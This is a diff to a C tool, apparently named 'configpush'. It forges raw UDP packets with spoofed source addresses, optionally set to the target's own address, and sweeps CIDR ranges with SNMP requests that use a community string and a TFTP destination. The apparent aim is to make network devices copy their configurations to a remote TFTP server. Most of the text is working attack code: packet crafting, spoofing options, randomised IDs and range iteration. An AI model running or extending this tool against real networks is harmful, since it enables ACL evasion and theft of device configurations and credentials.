@@ -11,6 +11,7 @@
 *	mkillebrew@net7systems.com
 *
 *  Not for distribution... my C is horrendous
+*  v 0.8.5
 */
 
 #include <stdio.h>
@@ -75,19 +76,39 @@ void *attenuate(){
         }
 }
 
+uint32_t lastrand;
 
 uint32_t randid(){
         uint32_t rnum;
-        time_t t;
 
-        srand((unsigned) time(&t));
         rnum = rand() & 0xff;
         rnum |= (rand() & 0xff) << 8;
         rnum |= (rand() & 0xff) << 16;
         rnum |= (rand() & 0xff) << 24;
+	lastrand=rnum;
+	srand(lastrand);
 
 	return rnum;
 }
+
+uint16_t rand16(){
+        uint16_t rnum;
+
+        rnum = rand() & 0xff;
+        rnum |= (rand() & 0xff) << 8;
+	lastrand=(uint32_t )rnum;
+	srand(lastrand);
+
+        return rnum;
+}
+
+int printusage(){
+                printf("Options:\n\t-t <target> or\n\t-r <cidr range>\n\n\t-t <tftp destination>\n\n\t-s <source spoof IP> or\n\t-S - spoof source from target address\n\n\t-c <community string>\n\t-m <speed limit in mbits>\n\t-i <interface>\n\n");
+                printf("example: ./configpush -i eth0 -r 10.0.0.0/24 -f 10.5.1.8 -s 10.99.99.99 -c private -m 5\nor\n");
+                printf("example: ./configpush -i eth0 -r 10.0.0.0/24 -f 10.5.1.8 -S -c private -m 5\n\n");
+                exit(1);
+}
+
 
 struct bcode *bencode(char *oid){
 
@@ -147,33 +168,29 @@ struct bcode *bencode(char *oid){
 }
 
 
-uint16_t
-checksum (uint16_t *addr, int len)
-{
-  int nleft = len;
-  int sum = 0;
-  uint16_t *w = addr;
-  uint16_t answer = 0;
+uint16_t checksum (uint16_t *addr, int len) {
+	int nleft = len;
+	int sum = 0;
+	uint16_t *w = addr, answer = 0;
 
-  while (nleft > 1) {
-    sum += *w++;
-    nleft -= sizeof (uint16_t);
-  }
+	while (nleft > 1) {
+		sum += *w++;
+		nleft -= sizeof (uint16_t);
+	}
 
-  if (nleft == 1) {
-    *(uint8_t *) (&answer) = *(uint8_t *) w;
-    sum += answer;
-  }
+	if (nleft == 1) {
+		*(uint8_t *) (&answer) = *(uint8_t *) w;
+		sum += answer;
+	}
 
-  sum = (sum >> 16) + (sum & 0xFFFF);
-  sum += (sum >> 16);
-  answer = ~sum;
-  return (answer);
+	sum = (sum >> 16) + (sum & 0xFFFF);
+	sum += (sum >> 16);
+	answer = ~sum;
+	return answer;
 }
 
 
-unsigned short in_cksum(unsigned short *addr, int len)
-{
+unsigned short in_cksum(unsigned short *addr, int len) {
 	int nleft = len;
 	int sum = 0;
 	unsigned short *w = addr;
@@ -195,8 +212,7 @@ unsigned short in_cksum(unsigned short *addr, int len)
 	return (answer);
 }
 	
-unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len)
-{
+unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len) {
 	struct psd_udp buf;
 
 	memset(&buf, 0, sizeof(buf));
@@ -209,62 +225,59 @@ unsigned short in_cksum_udp(int src, int dst, unsigned short *addr, int len)
 	return in_cksum((unsigned short *)&buf, 12 + len);
 }
 
-uint16_t
-udp4_checksum (struct ip iphdr, struct udphdr udphdr, uint8_t *payload, int payloadlen)
-{
-  char buf[IP_MAXPACKET];
-  char *ptr;
-  int chksumlen = 0;
-  int i;
+uint16_t udp4_checksum (struct ip iphdr, struct udphdr udphdr, uint8_t *payload, int payloadlen) {
+	char buf[IP_MAXPACKET];
+	char *ptr;
+	int chksumlen=0, i;
 
-  ptr = &buf[0];  // ptr points to beginning of buffer buf
+	ptr = &buf[0];  // ptr points to beginning of buffer buf
   
-  memcpy (ptr, &iphdr.ip_src.s_addr, sizeof (iphdr.ip_src.s_addr));
-  ptr += sizeof (iphdr.ip_src.s_addr);
-  chksumlen += sizeof (iphdr.ip_src.s_addr);
+	memcpy (ptr, &iphdr.ip_src.s_addr, sizeof (iphdr.ip_src.s_addr));
+	ptr += sizeof (iphdr.ip_src.s_addr);
+	chksumlen += sizeof (iphdr.ip_src.s_addr);
   
-  memcpy (ptr, &iphdr.ip_dst.s_addr, sizeof (iphdr.ip_dst.s_addr));
-  ptr += sizeof (iphdr.ip_dst.s_addr);
-  chksumlen += sizeof (iphdr.ip_dst.s_addr);
+	memcpy (ptr, &iphdr.ip_dst.s_addr, sizeof (iphdr.ip_dst.s_addr));
+	ptr += sizeof (iphdr.ip_dst.s_addr);
+	chksumlen += sizeof (iphdr.ip_dst.s_addr);
   
-  *ptr = 0; ptr++;
-  chksumlen += 1;
+	*ptr = 0; ptr++;
+	chksumlen += 1;
   
-  memcpy (ptr, &iphdr.ip_p, sizeof (iphdr.ip_p));
-  ptr += sizeof (iphdr.ip_p);
-  chksumlen += sizeof (iphdr.ip_p);
+	memcpy (ptr, &iphdr.ip_p, sizeof (iphdr.ip_p));
+	ptr += sizeof (iphdr.ip_p);
+	chksumlen += sizeof (iphdr.ip_p);
   
-  memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
-  ptr += sizeof (udphdr.len);
-  chksumlen += sizeof (udphdr.len);
+	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
+	ptr += sizeof (udphdr.len);
+	chksumlen += sizeof (udphdr.len);
   
-  memcpy (ptr, &udphdr.source, sizeof (udphdr.source));
-  ptr += sizeof (udphdr.source);
-  chksumlen += sizeof (udphdr.source);
+	memcpy (ptr, &udphdr.source, sizeof (udphdr.source));
+	ptr += sizeof (udphdr.source);
+	chksumlen += sizeof (udphdr.source);
   
-  memcpy (ptr, &udphdr.dest, sizeof (udphdr.dest));
-  ptr += sizeof (udphdr.dest);
-  chksumlen += sizeof (udphdr.dest);
+	memcpy (ptr, &udphdr.dest, sizeof (udphdr.dest));
+	ptr += sizeof (udphdr.dest);
+	chksumlen += sizeof (udphdr.dest);
   
-  memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
-  ptr += sizeof (udphdr.len);
-  chksumlen += sizeof (udphdr.len);
+	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
+	ptr += sizeof (udphdr.len);
+	chksumlen += sizeof (udphdr.len);
   
-  *ptr = 0; ptr++;
-  *ptr = 0; ptr++;
-  chksumlen += 2;
+	*ptr = 0; ptr++;
+	*ptr = 0; ptr++;
+	chksumlen += 2;
   
-  memcpy (ptr, payload, payloadlen);
-  ptr += payloadlen;
-  chksumlen += payloadlen;
+	memcpy (ptr, payload, payloadlen);
+	ptr += payloadlen;
+	chksumlen += payloadlen;
   
-  for (i=0; i<payloadlen%2; i++, ptr++) {
-    *ptr = 0;
-    ptr++;
-    chksumlen++;
-  }
-
-  return checksum((uint16_t *) buf, chksumlen);
+	for (i=0; i<payloadlen%2; i++, ptr++) {
+		*ptr = 0;
+		ptr++;
+		chksumlen++;
+	}
+	
+	return checksum((uint16_t *) buf, chksumlen);
 }
 
 
@@ -341,13 +354,13 @@ struct snmppdu *pdugen(u_char *community, u_char *target, u_char *tftp){
 
 
 	
-int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip){
+int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip, u_char *interface){
 
 	struct ip ip;
 	struct udphdr udp;
 	struct sockaddr_in sin;
 	int sd; 
-	const int on = 1;
+	const int one=1;
 	u_char *packet;
 	unsigned int sentbytes=0;
 
@@ -356,7 +369,7 @@ int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip){
 	ip.ip_v = 0x4;
 	ip.ip_tos = 0x0;
 	ip.ip_len = htons(IP4_HDRLEN + UDP_HDRLEN + data->length);
-	ip.ip_id = htons(12830);
+	ip.ip_id = htons(rand16());
 	ip.ip_off = 0x0;
 	ip.ip_ttl = 64;
 	ip.ip_p = IPPROTO_UDP;
@@ -367,8 +380,7 @@ int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip){
 	packet=(u_char *)malloc(512);
 	memcpy(packet, &ip, sizeof(ip));
 	
-	udp.source = htons(45512);
-	
+	udp.source = htons(rand16());
 	udp.dest = htons(161);
 	
 	udp.len = htons(UDP_HDRLEN + data->length);
@@ -383,10 +395,15 @@ int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip){
 		exit(1);
 	}
 
-	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
+	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
 		perror("setsockopt");
 		exit(1);
 	}
+
+        if (setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, interface, 4) < 0) {
+                perror("setsockopt");
+                exit(1);
+        }
 	memset(&sin, 0, sizeof(sin));
 	sin.sin_family = AF_INET;
 	sin.sin_addr.s_addr = ip.ip_dst.s_addr;
@@ -408,61 +425,72 @@ int sendpdu(struct snmppdu *data, u_char *target, u_char *spoofip){
 }
 
 int main(int argc, char **argv){
-
 	
-        u_char  *community, *target, *tftp, *spoofip;
+	time_t t;
+        u_char  *community, *target, *tftp, *spoofip, *interface;
 	struct snmppdu *pdu;
-	int xx, optindex;
+	int xx, optindex, fromself=0, single=0, oarg[]={0, 0, 0, 0, 0, 0, 0, 0};
         struct in_addr start;
         unsigned  mask, host;
-        char *range, *tmpip;
-
-
+        char *range, *tmpip, *cmask;
+	
         stats=(bandlimit *)malloc(sizeof(bandlimit));
         stats->bytes=0;
         stats->limit=625; // polling 1000/second set to (5mbit/8)/1000
 
         pthread_t attenuatethr;
-        pthread_create(&attenuatethr, NULL, attenuate, NULL);
-        if (pthread_mutex_init(&stats->lock, NULL) != 0) {
-                printf("failed to init mutex\n");
-                return 1;
-        }
 
-	if(argc < 2){
-		printf("%s -t <target> OR -r <cidr range> -f <tftp> -s <source spoof IP> -c <community> -m <speed limit in mbits>\n", argv[0]);
-		printf("example: %s -r 10.0.0.0/24 -f 10.5.1.8 -s 10.99.99.99 -c private -m 5\n\n", argv[0]);
-		return 1;
-	}
+	if(argc < 2) printusage();
 
+        srand((unsigned) time(&t));
 	community=(u_char *)malloc(64);
 	target=(u_char *)malloc(16);
 	tftp=(u_char *)malloc(16);
 	spoofip=(u_char *)malloc(16);
+	interface=(u_char *)malloc(4);
 
-	while((optindex = getopt(argc, argv, "c:t:f:s:r:m:")) != -1)
+	while((optindex = getopt(argc, argv, "c:t:f:s:r:m:Si:")) != -1){
 		switch(optindex){
 			case 'c':
 				community=optarg;
+				oarg[0]=1;
 				break;
 			case 't':
 				target=optarg;
+				single=1;
+				oarg[1]=1;
 				break;
 			case 'f':
 				tftp=optarg;
+				oarg[2]=1;
 				break;
 			case 's':
 				spoofip=optarg;
+				oarg[3]=1;
 				break;
 			case 'r':
+				single=0;
 				range=optarg;
 				tmpip=strtok(range, "/");
-				mask=atoi(strtok(NULL, "/"));
+				if(tmpip == NULL) printusage();
+				cmask=strtok(NULL, "/");
+                                if(cmask == NULL) printusage();
+				mask=atoi(cmask);
         			host=exp2(32-mask);
         			inet_aton(tmpip, &start);
+				oarg[4]=1;
 				break;
 			case 'm':
 				stats->limit=atoi(optarg)*1000/8;
+				oarg[5]=1;
+				break;
+			case 'S':
+				fromself=1;
+				oarg[6]=1;
+				break;
+			case 'i':
+				interface=optarg;
+				oarg[7]=1;
 				break;
 			case '?':
 				fprintf(stderr, "Unknown option character `%c'.\n", optopt);
@@ -470,23 +498,47 @@ int main(int argc, char **argv){
 			default:
 				abort();
 		}
-	
-			
-
-	target=inet_ntoa(start);
-	for(xx=0; xx < host; xx++){
-		target=inet_ntoa(start);
-		pdu=pdugen(community, target, tftp);
-		pthread_mutex_lock(&stats->lock);
-		stats->bytes+=sendpdu(pdu, target, spoofip);
-		pthread_mutex_unlock(&stats->lock);
-		start.s_addr=htonl(ntohl(start.s_addr)+1);
-		target=inet_ntoa(start);
 	}
 
-	running=0;
-        pthread_join(attenuatethr, NULL);
-        pthread_mutex_destroy(&stats->lock);
+	if(!oarg[0] || !oarg[2] || !oarg[7]) printusage();
+	if(oarg[1] && oarg[4]) printusage();
+	if(oarg[6] && oarg[3]) printusage();
+	
+	if(single==0){
+
+	        pthread_create(&attenuatethr, NULL, attenuate, NULL);
+        	if (pthread_mutex_init(&stats->lock, NULL) != 0) {
+                	printf("failed to init mutex\n");
+                	return 1;
+        	}
+
+		target=inet_ntoa(start);
+		for(xx=0; xx < host; xx++){
+                	if(fromself==1){
+                        	spoofip=inet_ntoa(start);
+                	}
+			target=inet_ntoa(start);
+			pdu=pdugen(community, target, tftp);
+			pthread_mutex_lock(&stats->lock);
+			stats->bytes+=sendpdu(pdu, target, spoofip, interface);
+			pthread_mutex_unlock(&stats->lock);
+			start.s_addr=htonl(ntohl(start.s_addr)+1);
+			target=inet_ntoa(start);
+		}
+	        running=0;
+        	pthread_join(attenuatethr, NULL);
+        	pthread_mutex_destroy(&stats->lock);
+	}
+	
+	if(single==1){
+                if(fromself==1){
+                        spoofip=target;
+                }
+		pdu=pdugen(community, target, tftp);
+		sendpdu(pdu, target, spoofip, interface);
+	}
+
+
 	return 0;
 }
 
